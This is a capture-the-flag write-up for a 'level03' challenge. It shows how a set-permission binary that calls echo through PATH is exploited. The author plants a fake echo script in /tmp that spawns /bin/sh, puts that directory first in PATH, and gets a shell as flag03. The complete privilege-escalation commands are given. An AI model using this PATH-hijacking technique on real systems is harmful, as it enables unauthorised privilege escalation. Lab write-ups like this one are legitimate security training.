LEVEL03
=======

1. **See what' s in the directory**

    cmd: ```ls```
    output: ```level02```
    We notice that the file is a binary with the <u>execution permission of flag03</u>. Well then the goal is to using this breach.

2. **What does the binary file do ?**

    Use ```strace``` (for system call) or ```ltrace``` (for library call) to see what happen when we run the binary. The binary use the PATH variable to excecute ```echo```. We are going to use this breach to go up to the flag03 role: the goal is to open a shell with flag03 persmissions.

3. **Create fake echo**

    - We create a fake echo command with ```mkdir /tmp/fake_echo``` and ```echo -e '#!/bin/sh\n/bin/sh' > /tmp/fake_echo/echo```
    - Then we will add this directory to PATH in first position to force the binary to check this path: ```export PATH=/tmp/fake_echo:$PATH```
    - Don't forget to add an executable permission or it will not work ```chmod +x /tmp/fake_echo/echo```

4. **Get the flag**

    We now run the binary file and a shell is opened. We check if it worked with ```whoami``` and the result is **flag03**.